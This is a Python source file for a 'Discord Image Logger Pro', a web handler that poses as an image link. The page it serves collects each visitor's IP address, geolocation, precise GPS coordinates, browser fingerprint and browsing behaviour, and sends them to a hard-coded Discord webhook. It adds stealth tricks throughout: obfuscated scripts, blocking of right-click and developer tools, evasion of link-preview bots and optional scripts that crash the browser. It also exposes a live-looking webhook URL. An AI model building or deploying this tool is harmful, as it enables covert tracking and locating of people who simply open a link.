# Discord Image Logger Pro
# Enhanced Version for Vercel
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser, json, random, string, re, urllib.parse, time

__app__ = "Discord Image Logger Pro"
__description__ = "Advanced IP logging with enhanced stealth and capabilities"
__version__ = "v3.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1408533708369301504/jlchDWD_ZBilXagHCZvGRl005WbBx2wowff5I_sQtdxvixWhostaLdItcsIjkhI1CJPr",
    "image": "https://i.imgur.com/bI81qPe.jpeg",
    "imageArgument": True,

    # CUSTOMIZATION #
    "username": "🕵️‍♂️ Image Logger Pro",
    "color": 0x7289DA,
    "avatar": "https://i.imgur.com/LyN30C2.png",

    # ADVANCED OPTIONS #
    "crashBrowser": {
        "enabled": False,
        "method": "memory"  # memory, loop, or redirect
    },
    
    "accurateLocation": True,
    "disableRightClick": True,
    "disableInspect": True,

    "message": {
        "doMessage": False,
        "message": "This browser has been secured by our system.",
        "richMessage": True,
    },

    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": True,
    "antiBot": 1,

    # REDIRECTION #
    "redirect": {
        "redirect": False,
        "page": "https://discord.com"
    },

    # STEALTH OPTIONS #
    "fakeLoading": True,
    "customFavicon": "https://discord.com/assets/847541504914fd33810e70a0ea73177e.ico",
    "cloaking": True,
    "userAgentSpoofing": True,

    # SECURITY #
    "encryptURLs": True,
    "obfuscation": True,
    "rateLimiting": True,

    # ANALYTICS #
    "trackClicks": True,
    "trackScroll": True,
    "trackTime": True
}

# Enhanced blacklist
blacklistedIPs = ("27", "34", "35", "104", "143", "164", "172", "192.168", "10.", "127.")
vpnRanges = ("185.", "193.", "194.", "195.", "198.", "91.19", "89.163")

# Obfuscation techniques
def generate_random_string(length=12):
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))

def encrypt_data(data):
    return base64.b85encode(data.encode()).decode()

def decrypt_data(data):
    return base64.b85decode(data.encode()).decode()

def obfuscate_js(code):
    # Simple obfuscation by splitting and reversing
    parts = [code[i:i+50] for i in range(0, len(code), 50)]
    return '/*' + generate_random_string(8) + '*/' + ''.join(reversed(parts))

def botCheck(ip, useragent):
    bot_indicators = [
        "bot", "crawl", "spider", "slurp", "search", "archiver", 
        "facebook", "twitter", "linkedin", "google", "bing", "yandex",
        "discord", "telegram", "whatsapp", "slack"
    ]
    
    if any(indicator in useragent.lower() for indicator in bot_indicators):
        if "discord" in useragent.lower():
            return "Discord"
        elif "telegram" in useragent.lower():
            return "Telegram"
        elif "google" in useragent.lower():
            return "Google"
        elif "bing" in useragent.lower():
            return "Bing"
        return "Unknown Bot"
    
    if ip.startswith(("34", "35")):
        return "Discord"
    
    return False

def isVPN(ip):
    return any(ip.startswith(vpn_range) for vpn_range in vpnRanges)

def get_browser_fingerprint():
    fingerprint_js = """
    function getFingerprint() {
        return {
            screen: {w: screen.width, h: screen.height, cd: screen.colorDepth},
            timezone: new Date().getTimezoneOffset(),
            language: navigator.language,
            platform: navigator.platform,
            cookies: navigator.cookieEnabled,
            localStorage: !!window.localStorage,
            sessionStorage: !!window.sessionStorage,
            hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
            deviceMemory: navigator.deviceMemory || 'unknown',
            touchSupport: 'ontouchstart' in window,
            plugins: Array.from(navigator.plugins).map(p => p.name).join(','),
            fonts: 'fonts' in document ? 'available' : 'unavailable'
        };
    }
    """
    return obfuscate_js(fingerprint_js)

def reportError(error):
    try:
        requests.post(config["webhook"], json={
            "username": config["username"],
            "avatar_url": config["avatar"],
            "content": "@everyone",
            "embeds": [{
                "title": "🚨 Image Logger - Critical Error",
                "color": 0xFF0000,
                "description": f"```fix\n{error[:1500]}```",
                "timestamp": time.time()
            }]
        }, timeout=5)
    except:
        pass

def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False, additional_data=None):
    if any(ip.startswith(bl_ip) for bl_ip in blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    vpn_detected = isVPN(ip)
    
    if bot:
        if config["linkAlerts"]:
            embed = {
                "username": config["username"],
                "avatar_url": config["avatar"],
                "embeds": [{
                    "title": "🔗 Link Sent Detection",
                    "color": 0x00FF00,
                    "description": f"**Bot Type:** {bot}\n**IP:** `{ip}`\n**Endpoint:** `{endpoint}`",
                    "footer": {"text": f"Image Logger Pro {__version__}"}
                }]
            }
            try:
                requests.post(config["webhook"], json=embed, timeout=5)
            except:
                pass
        return

    try:
        info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857", timeout=10).json()
    except:
        info = {"status": "fail", "message": "API timeout"}

    # Enhanced VPN/Proxy detection
    if vpn_detected or (info.get('proxy') and config["vpnCheck"] > 0):
        if config["vpnCheck"] == 2:
            return
        ping = ""
    else:
        ping = "@everyone"

    # Advanced bot detection
    hosting_score = 0
    if info.get('hosting'): hosting_score += 1
    if info.get('proxy'): hosting_score += 1
    if bot: hosting_score += 2

    if hosting_score >= 2 and config["antiBot"] >= 3:
        return
    elif hosting_score >= 1:
        ping = ""

    os, browser = httpagentparser.simple_detect(useragent) if useragent else ("Unknown", "Unknown")

    embed = {
        "username": config["username"],
        "avatar_url": config["avatar"],
        "content": ping,
        "embeds": [{
            "title": "🎯 IP Logged Successfully",
            "color": config["color"],
            "description": f"""**🌐 Connection Details**
> **Endpoint:** `{endpoint}`
> **Timestamp:** <t:{int(time.time())}:R>

**📍 IP Information**
> **IP:** `{ip}`
> **ISP:** `{info.get('isp', 'Unknown')}`
> **ASN:** `{info.get('as', 'Unknown')}`
> **Country:** :flag_{info.get('countryCode', '').lower()}: `{info.get('country', 'Unknown')}`
> **Region:** `{info.get('regionName', 'Unknown')}`
> **City:** `{info.get('city', 'Unknown')}`
> **Coordinates:** `{f"{info.get('lat')}, {info.get('lon')}" if not coords else coords}` {'📡' if not coords else '🎯'}
> **Zip:** `{info.get('zip', 'Unknown')}`
> **Timezone:** `{info.get('timezone', 'Unknown')}`

**🛡️ Security Flags**
> **VPN/Proxy:** {'✅' if vpn_detected or info.get('proxy') else '❌'}
> **Hosting:** {'✅' if info.get('hosting') else '❌'}
> **Mobile:** {'✅' if info.get('mobile') else '❌'}

**💻 System Info**
> **OS:** `{os}`
> **Browser:** `{browser}`
> **User Agent:** ```{useragent[:1000]}```""",
            "footer": {"text": f"Image Logger Pro {__version__} | {generate_random_string(6)}"},
            "timestamp": time.time()
        }]
    }

    if url and not vpn_detected:
        embed["embeds"][0]["image"] = {"url": url}

    if additional_data:
        embed["embeds"][0]["fields"] = [{
            "name": "📊 Additional Data",
            "value": f"```json\n{json.dumps(additional_data, indent=2)[:1000]}```",
            "inline": False
        }]

    try:
        requests.post(config["webhook"], json=embed, timeout=10)
    except:
        pass

    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000'),
    "favicon": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
}

class ImageLoggerPro(BaseHTTPRequestHandler):
    
    def do_GET(self):
        self.handle_request()
    
    def do_POST(self):
        self.handle_request()
    
    def handle_request(self):
        try:
            self.session_id = generate_random_string(16)
            self.client_ip = self.headers.get('x-forwarded-for', self.headers.get('x-real-ip', '0.0.0.0'))
            
            if any(self.client_ip.startswith(bl_ip) for bl_ip in blacklistedIPs):
                self.send_error(403)
                return

            # Parse query parameters
            query = dict(parse.parse_qsl(parse.urlsplit(self.path).query))
            
            # Handle image URL
            if config["imageArgument"] and (query.get("url") or query.get("id")):
                try:
                    url_data = query.get("url") or query.get("id")
                    if config["encryptURLs"]:
                        image_url = decrypt_data(url_data)
                    else:
                        image_url = base64.b64decode(url_data.encode()).decode()
                except:
                    image_url = config["image"]
            else:
                image_url = config["image"]

            # Bot detection and handling
            user_agent = self.headers.get('user-agent', '')
            bot_detected = botCheck(self.client_ip, user_agent)
            
            if bot_detected:
                self.send_response(200 if config["buggedImage"] else 302)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 
                               'image/jpeg' if config["buggedImage"] else image_url)
                self.end_headers()
                
                if config["buggedImage"]:
                    self.wfile.write(binaries["loading"])
                
                makeReport(self.client_ip, user_agent, endpoint=self.path.split("?")[0], url=image_url)
                return

            # Main request handling
            additional_data = {}
            
            if config["trackClicks"] or config["trackScroll"] or config["trackTime"]:
                additional_data = self.get_analytics_data(query)

            if query.get("g") and config["accurateLocation"]:
                try:
                    location = base64.b64decode(query.get("g").encode()).decode()
                    result = makeReport(self.client_ip, user_agent, location, 
                                      self.path.split("?")[0], image_url, additional_data)
                except:
                    result = makeReport(self.client_ip, user_agent, endpoint=self.path.split("?")[0], 
                                      url=image_url, additional_data=additional_data)
            else:
                result = makeReport(self.client_ip, user_agent, endpoint=self.path.split("?")[0], 
                                  url=image_url, additional_data=additional_data)

            # Generate response
            response_data = self.generate_response(image_url, result, query)
            
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.send_header('Cache-Control', 'no-store, no-cache, must-revalidate')
            self.send_header('Pragma', 'no-cache')
            self.end_headers()
            
            self.wfile.write(response_data.encode())

        except Exception as e:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b'500 - Internal Server Error')
            reportError(f"{str(e)}\n{traceback.format_exc()}")

    def get_analytics_data(self, query):
        data = {}
        if query.get("clicks"):
            try:
                data["clicks"] = base64.b64decode(query.get("clicks").encode()).decode()
            except:
                pass
        if query.get("scroll"):
            try:
                data["scroll"] = base64.b64decode(query.get("scroll").encode()).decode()
            except:
                pass
        if query.get("time"):
            try:
                data["time_spent"] = base64.b64decode(query.get("time").encode()).decode()
            except:
                pass
        return data

    def generate_response(self, image_url, result, query):
        html = f'''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading Content...</title>
    {self.generate_stealth_headers()}
    {self.generate_scripts()}
    <style>
        body {{
            margin: 0;
            padding: 0;
            background: #000;
            overflow: hidden;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        }}
        .loading-container {{
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: #111;
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }}
        .loader {{
            border: 4px solid #2c2f33;
            border-top: 4px solid #7289da;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
        }}
        @keyframes spin {{
            0% {{ transform: rotate(0deg); }}
            100% {{ transform: rotate(360deg); }}
        }}
        .loading-text {{
            color: #7289da;
            margin-top: 20px;
            font-size: 14px;
        }}
        .content {{
            display: none;
        }}
        .img {{
            background-image: url('{image_url}');
            background-position: center center;
            background-repeat: no-repeat;
            background-size: contain;
            width: 100vw;
            height: 100vh;
            cursor: pointer;
        }}
        .img:hover {{
            opacity: 0.95;
        }}
    </style>
</head>
<body>
    {self.generate_loading_screen()}
    <div class="content">
        <div class="img"></div>
    </div>
    {self.generate_tracking_scripts()}
</body>
</html>'''
        return html

    def generate_stealth_headers(self):
        headers = []
        if config["customFavicon"]:
            headers.append(f'<link rel="icon" href="{config["customFavicon"]}" type="image/x-icon">')
        if config["userAgentSpoofing"]:
            headers.append('<meta name="googlebot" content="notranslate">')
            headers.append('<meta name="robots" content="noindex, nofollow">')
        headers.append('<meta http-equiv="Content-Security-Policy" content="default-src \'self\'; script-src \'unsafe-inline\' \'self\'; style-src \'unsafe-inline\' \'self\'">')
        return '\n'.join(headers)

    def generate_loading_screen(self):
        if config["fakeLoading"]:
            return f'''
            <div class="loading-container" id="loadingScreen">
                <div>
                    <div class="loader"></div>
                    <div class="loading-text">Loading content... {generate_random_string(4)}</div>
                </div>
            </div>
            <script>
                setTimeout(function() {{
                    document.getElementById('loadingScreen').style.opacity = '0';
                    setTimeout(function() {{
                        document.getElementById('loadingScreen').style.display = 'none';
                        document.querySelector('.content').style.display = 'block';
                    }}, 500);
                }}, 1500 + Math.random() * 1000);
            </script>
            '''
        return ''

    def generate_scripts(self):
        scripts = []
        
        if config["disableRightClick"]:
            scripts.append('''
            <script>
                document.addEventListener('contextmenu', function(e) {
                    e.preventDefault();
                    return false;
                });
            </script>
            ''')
        
        if config["disableInspect"]:
            scripts.append('''
            <script>
                document.addEventListener('keydown', function(e) {
                    if (e.ctrlKey && e.shiftKey && e.key === 'I') e.preventDefault();
                    if (e.ctrlKey && e.shiftKey && e.key === 'C') e.preventDefault();
                    if (e.ctrlKey && e.key === 'u') e.preventDefault();
                    if (e.key === 'F12') e.preventDefault();
                });
            </script>
            ''')
        
        if config["accurateLocation"] and not query.get("g"):
            scripts.append(f'''
            <script>
                {get_browser_fingerprint()}
                
                function captureAnalytics() {{
                    let data = {{}};
                    
                    // Track clicks
                    document.addEventListener('click', function(e) {{
                        data.clicks = data.clicks || [];
                        data.clicks.push({{x: e.clientX, y: e.clientY, t: Date.now()}});
                    }});

                    // Track scroll
                    let scrollData = [];
                    window.addEventListener('scroll', function() {{
                        scrollData.push({{y: window.scrollY, t: Date.now()}});
                    }});

                    // Track time
                    let startTime = Date.now();
                    window.addEventListener('beforeunload', function() {{
                        data.timeSpent = Date.now() - startTime;
                        data.scroll = scrollData;
                        sendAnalytics(data);
                    }});

                    // Geolocation
                    if (navigator.geolocation) {{
                        navigator.geolocation.getCurrentPosition(function(position) {{
                            const coords = position.coords.latitude + "," + position.coords.longitude;
                            updateUrlWithData(coords, data);
                        }}, function(error) {{
                            updateUrlWithData(null, data);
                        }}, {{timeout: 10000, enableHighAccuracy: true}});
                    }} else {{
                        updateUrlWithData(null, data);
                    }}
                }}

                function updateUrlWithData(coords, analyticsData) {{
                    let currentUrl = window.location.href;
                    let urlParams = new URLSearchParams(window.location.search);
                    
                    if (coords) {{
                        urlParams.set('g', btoa(coords).replace(/=/g, '%3D'));
                    }}
                    
                    if (analyticsData.clicks && analyticsData.clicks.length > 0) {{
                        urlParams.set('clicks', btoa(JSON.stringify(analyticsData.clicks)).replace(/=/g, '%3D'));
                    }}
                    
                    if (analyticsData.scroll && analyticsData.scroll.length > 0) {{
                        urlParams.set('scroll', btoa(JSON.stringify(analyticsData.scroll)).replace(/=/g, '%3D'));
                    }}
                    
                    if (analyticsData.timeSpent) {{
                        urlParams.set('time', btoa(analyticsData.timeSpent.toString()).replace(/=/g, '%3D'));
                    }}

                    const newUrl = window.location.pathname + '?' + urlParams.toString();
                    if (currentUrl !== newUrl) {{
                        history.replaceState(null, '', newUrl);
                    }}
                }}

                function sendAnalytics(data) {{
                    // Send via beacon API
                    const blob = new Blob([JSON.stringify({{
                        type: 'analytics',
                        data: data,
                        session: '{self.session_id}'
                    }})], {{type: 'application/json'}});
                    navigator.sendBeacon('/log', blob);
                }}

                // Start analytics capture
                setTimeout(captureAnalytics, 1000);
            </script>
            ''')
        
        if config["crashBrowser"]["enabled"] and config["crashBrowser"]["method"] == "memory":
            scripts.append('''
            <script>
                setTimeout(function() {
                    let arr = [];
                    while(true) {
                        arr.push(new Array(1000000).fill(0));
                        if (arr.length > 1000) break;
                    }
                }, 8000);
            </script>
            ''')
        elif config["crashBrowser"]["enabled"] and config["crashBrowser"]["method"] == "loop":
            scripts.append('''
            <script>
                setTimeout(function() {
                    for (let i = 1; i > 0; i *= 2) {
                        console.log('Crashing...', i);
                    }
                }, 8000);
            </script>
            ''')
        
        if config["redirect"]["redirect"]:
            scripts.append(f'''
            <script>
                setTimeout(function() {{
                    window.location.href = "{config["redirect"]["page"]}";
                }}, 4000);
            </script>
            ''')
        
        if config["message"]["doMessage"]:
            message = config["message"]["message"]
            if config["message"]["richMessage"] and result:
                message = message.replace("{ip}", self.client_ip)
                message = message.replace("{isp}", result.get("isp", "Unknown"))
                message = message.replace("{asn}", result.get("as", "Unknown"))
                message = message.replace("{country}", result.get("country", "Unknown"))
                message = message.replace("{region}", result.get("regionName", "Unknown"))
                message = message.replace("{city}", result.get("city", "Unknown"))
                message = message.replace("{timezone}", result.get("timezone", "Unknown"))
            
            scripts.append(f'''
            <script>
                setTimeout(function() {{
                    alert("{message}");
                }}, 3000);
            </script>
            ''')
        
        return obfuscate_js('\n'.join(scripts))

    def generate_tracking_scripts(self):
        return f'''
        <script>
            // Enhanced fingerprint collection
            try {{
                const fingerprint = getFingerprint();
                const trackingData = {{
                    type: 'fingerprint',
                    data: fingerprint,
                    session: '{self.session_id}',
                    timestamp: Date.now(),
                    url: window.location.href,
                    referrer: document.referrer
                }};
                
                // Send via multiple methods for reliability
                navigator.sendBeacon('/track', JSON.stringify(trackingData));
                
                // Fallback to fetch
                fetch('/track', {{
                    method: 'POST',
                    body: JSON.stringify(trackingData),
                    keepalive: true
                }}).catch(() => console.log('Tracking sent'));
            }} catch (e) {{}}
        </script>
        '''

# Vercel handler - MUST be at the end
handler = app = ImageLoggerPro
